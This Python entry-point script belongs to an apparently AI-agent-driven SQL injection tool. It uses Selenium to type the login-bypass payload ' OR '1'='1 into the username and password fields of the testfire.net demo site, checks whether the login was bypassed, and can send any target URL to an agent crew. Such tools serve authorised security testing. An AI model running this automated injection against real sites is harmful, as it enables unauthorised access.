#!/usr/bin/env python
import sys
import warnings
import argparse
from datetime import datetime
from cursor_sqli.crew import CursorSqli
import os
import logging
from cursor_sqli.tools.executor_tools import BrowserAutomationTool, FirefoxBrowserAutomationTool

warnings.filterwarnings("ignore", category=SyntaxWarning, module="pysbd")

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='SQL Injection Tool using CrewAI')
    parser.add_argument('--target', '-t', required=True, help='Target URL to scan for SQL injection vulnerabilities')
    parser.add_argument('--test-browser', choices=['chrome', 'firefox'], help='Test browser automation only')
    parser.add_argument('--visible', action='store_true', help='Run browser in visible mode to see the injection in real-time')
    parser.add_argument('--delay', type=float, default=0, help='Add delay between browser actions (in seconds)')
    return parser.parse_args()

# This main file is intended to be a way for you to run your
# crew locally, so refrain from adding unnecessary logic into this file.
# Replace with inputs you want to test with, it will automatically
# interpolate any tasks and agents information

def test_browser_automation(url, browser="firefox", visible_mode=False, delay=0):
    """
    Test the browser automation functionality with a simple payload.
    
    Args:
        url: Target URL to test
        browser: Browser to use ('chrome' or 'firefox')
        visible_mode: Whether to run the browser in visible mode
        delay: Additional delay between browser actions (in seconds)
    """
    logger.info(f"Testing {browser} browser automation on {url}")
    logger.info(f"Visible mode: {'Yes' if visible_mode else 'No'}")
    
    if delay > 0:
        logger.info(f"Using additional delay of {delay} seconds between actions")
        # Monkey patch time.sleep to add our delay
        import time
        original_sleep = time.sleep
        
        def delayed_sleep(seconds):
            original_sleep(seconds + delay)
            
        time.sleep = delayed_sleep
    
    # For Google search, we'll use the search input field
    if "google.com" in url:
        entry_point = {
            'type': 'form_input',
            'selector': 'textarea[name="q"]',  # Google search input selector
            'selector_type': 'css'
        }
        payload = "SQL injection test"  # Harmless test for Google
    elif "testfire.net" in url:
        # This is a demo site with intentional vulnerabilities
        entry_point = {
            'type': 'form_input',
            'selector': 'input[name="uid"]',  # Username field on login form
            'selector_type': 'css'
        }
        # Classic SQL injection payload for authentication bypass
        payload = "' OR '1'='1"
    else:
        # Default to a generic form input
        entry_point = {
            'type': 'form_input',
            'selector': 'input[type="text"]',  # Generic text input
            'selector_type': 'css'
        }
        payload = "SQL injection test"  # Default harmless payload
    
    if browser.lower() == "firefox":
        tool = FirefoxBrowserAutomationTool()
    else:
        tool = BrowserAutomationTool()
    
    # Create a custom entry point function for Google search specifically
    if "google.com" in url:
        logger.info("Using custom Google search handling")
        # Use the tool's underlying logic but apply custom handling
        driver = None
        try:
            if browser.lower() == "firefox":
                from selenium.webdriver.firefox.options import Options as FirefoxOptions
                from selenium.webdriver.firefox.service import Service as FirefoxService
                from webdriver_manager.firefox import GeckoDriverManager
                from selenium import webdriver
                from selenium.webdriver.common.by import By
                from selenium.webdriver.common.keys import Keys
                import os
                import platform
                
                firefox_options = FirefoxOptions()
                if not visible_mode:
                    firefox_options.add_argument("--headless")
                
                # Set up the WebDriver with appropriate config for the platform
                if platform.system() == "Windows":
                    service = FirefoxService(GeckoDriverManager().install(), log_path=os.devnull)
                else:
                    service = FirefoxService(GeckoDriverManager().install())
                
                driver = webdriver.Firefox(service=service, options=firefox_options)
            else:
                from selenium.webdriver.chrome.options import Options as ChromeOptions
                from selenium.webdriver.chrome.service import Service as ChromeService
                from webdriver_manager.chrome import ChromeDriverManager
                from selenium import webdriver
                from selenium.webdriver.common.by import By
                from selenium.webdriver.common.keys import Keys
                
                chrome_options = ChromeOptions()
                if not visible_mode:
                    chrome_options.add_argument("--headless=new")
                chrome_options.add_argument("--no-sandbox")
                chrome_options.add_argument("--disable-dev-shm-usage")
                
                service = ChromeService(ChromeDriverManager().install())
                driver = webdriver.Chrome(service=service, options=chrome_options)
            
            # Navigate to Google
            logger.info(f"Navigating to {url}")
            driver.get(url)
            
            # Find the search box
            search_box = driver.find_element(By.NAME, 'q')
            
            # Enter the search query
            search_box.clear()
            search_box.send_keys(payload)
            
            # Press Enter to submit
            logger.info("Pressing Enter to submit search")
            search_box.send_keys(Keys.RETURN)
            
            # Wait for results page
            import time
            time.sleep(3)
            
            # Take a screenshot
            os.makedirs("screenshots", exist_ok=True)
            screenshot_path = f"screenshots/google_search_test.png"
            driver.save_screenshot(screenshot_path)
            
            logger.info(f"Screenshot saved to {screenshot_path}")
            result = f"Browser test successful! Screenshot saved to {screenshot_path}"
            
        except Exception as e:
            logger.error(f"Error in custom Google test: {str(e)}")
            result = f"Error in custom Google test: {str(e)}"
        finally:
            if driver:
                driver.quit()
        
        return result
        
    # For testfire.net, we want to use the tool with our specific instructions
    if "testfire.net" in url:
        logger.info("Testing SQL injection on testfire demo site")
        
        # For testfire, we need to manually handle both fields because of alerts
        from selenium import webdriver
        from selenium.webdriver.firefox.options import Options as FirefoxOptions
        from selenium.webdriver.chrome.options import Options as ChromeOptions
        from selenium.webdriver.firefox.service import Service as FirefoxService
        from selenium.webdriver.chrome.service import Service as ChromeService
        from webdriver_manager.firefox import GeckoDriverManager
        from webdriver_manager.chrome import ChromeDriverManager
        from selenium.webdriver.common.by import By
        from selenium.webdriver.common.keys import Keys
        from selenium.webdriver.common.alert import Alert
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        import time
        import os
        
        driver = None
        try:
            # Set up appropriate browser
            if browser.lower() == "firefox":
                firefox_options = FirefoxOptions()
                if not visible_mode:
                    firefox_options.add_argument("--headless")
                service = FirefoxService(GeckoDriverManager().install())
                driver = webdriver.Firefox(service=service, options=firefox_options)
            else:
                chrome_options = ChromeOptions()
                if not visible_mode:
                    chrome_options.add_argument("--headless=new")
                chrome_options.add_argument("--no-sandbox")
                service = ChromeService(ChromeDriverManager().install())
                driver = webdriver.Chrome(service=service, options=chrome_options)
            
            # Navigate to the login page
            logger.info(f"Navigating to {url}")
            driver.get(url)
            
            # Find username field and enter SQL injection payload
            username_field = driver.find_element(By.NAME, 'uid')
            username_field.clear()
            username_field.send_keys("' OR '1'='1")
            logger.info("Injected payload into username field")
            
            # Find password field and enter a dummy password
            password_field = driver.find_element(By.NAME, 'passw')
            password_field.clear()
            password_field.send_keys("' OR '1'='1")
            logger.info("Injected payload into password field")
            
            # Click the login button instead of pressing enter
            submit_button = driver.find_element(By.NAME, 'btnSubmit')
            submit_button.click()
            logger.info("Clicked submit button")
            
            # Handle any alerts - wait up to 2 seconds for an alert
            try:
                WebDriverWait(driver, 2).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                alert_text = alert.text
                logger.info(f"Alert detected: {alert_text}")
                alert.accept()
            except:
                logger.info("No alert detected")
            
            # Wait for page to load
            time.sleep(3)
            
            # Take a screenshot
            os.makedirs("screenshots", exist_ok=True)
            screenshot_path = f"screenshots/testfire_injection_test.png"
            driver.save_screenshot(screenshot_path)
            
            # Check if we successfully bypassed login
            page_source = driver.page_source
            if "Sign Off" in page_source:
                result = f"SUCCESS! SQL Injection worked - login bypassed. Screenshot saved to {screenshot_path}"
                logger.info("SQL Injection successful - login bypassed")
            else:
                result = f"SQL Injection failed to bypass login. Screenshot saved to {screenshot_path}"
                logger.info("SQL Injection failed")
            
        except Exception as e:
            logger.error(f"Error in testfire test: {str(e)}")
            result = f"Error testing SQL injection on testfire: {str(e)}"
        finally:
            if driver:
                driver.quit()
        
        logger.info(f"Browser automation test completed on testfire")
        print(result)
        return result
    
    # For other sites, use the regular automation
    try:
        if browser.lower() == "firefox":
            # Make sure entry_point is a valid dictionary for Firefox tool
            if not isinstance(entry_point, dict):
                logger.error(f"Invalid entry_point format: {entry_point}")
                return "Error: entry_point must be a dictionary for Firefox automation"
            
            result = tool._run(
                target_url=url,
                payload=payload,
                entry_point=entry_point,  # Ensure this is a dictionary
                capture_screenshot=True,
                max_retries=3,
                popup_timeout=5,
                visible_mode=visible_mode  # Pass the visible mode parameter
            )
        else:
            # Add visible_mode parameter if BrowserAutomationTool supports it
            result = tool._run(
                target_url=url,
                payload=payload,
                entry_point=entry_point,
                capture_screenshot=True
            )
    except Exception as e:
        logger.error(f"Error calling browser automation tool: {str(e)}")
        result = f"Error in browser automation: {str(e)}"
    
    # Log and return the result
    logger.info(f"Browser automation test completed")
    print(result)
    return result

def run_crew(args):
    """
    Run the complete SQL injection crew process
    """
    # Initialize the crew
    crew = CursorSqli()
    # Start the crew process
    result = crew.crew().kickoff(inputs={
        "target_url": args.target,
        "visible_mode": args.visible,
        "delay": args.delay
    })
    return result

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Testing Tool')
    parser.add_argument('--target', '-t', required=True, help='Target URL for SQL injection testing')
    parser.add_argument('--test-browser', choices=['chrome', 'firefox'], help='Test browser automation only')
    parser.add_argument('--visible', action='store_true', help='Run browser in visible mode')
    parser.add_argument('--delay', type=float, default=0, help='Add delay between browser actions (in seconds)')
    
    args = parser.parse_args()
    
    # Check if screenshots directory exists, create if not
    if not os.path.exists('screenshots'):
        os.makedirs('screenshots')
    
    if args.test_browser:
        # Run only browser automation test
        test_browser_automation(args.target, args.test_browser, args.visible, args.delay)
    else:
        # Run the full crew process
        result = run_crew(args)
        print(result)

if __name__ == "__main__":
    main()

def train():
    """
    Train the crew for a given number of iterations.
    """
    args = parse_arguments()
    
    inputs = {
        "target_url": args.target,
        'current_year': str(datetime.now().year)
    }
    try:
        CursorSqli().crew().train(n_iterations=int(sys.argv[1]), filename=sys.argv[2], inputs=inputs)

    except Exception as e:
        raise Exception(f"An error occurred while training the crew: {e}")

def replay():
    """
    Replay the crew execution from a specific task.
    """
    try:
        CursorSqli().crew().replay(task_id=sys.argv[1])

    except Exception as e:
        raise Exception(f"An error occurred while replaying the crew: {e}")

def test():
    """
    Test the crew execution and returns the results.
    """
    args = parse_arguments()
    
    inputs = {
        "target_url": args.target,
        "current_year": str(datetime.now().year)
    }
    
    try:
        CursorSqli().crew().test(n_iterations=int(sys.argv[1]), eval_llm=sys.argv[2], inputs=inputs)

    except Exception as e:
        raise Exception(f"An error occurred while testing the crew: {e}")
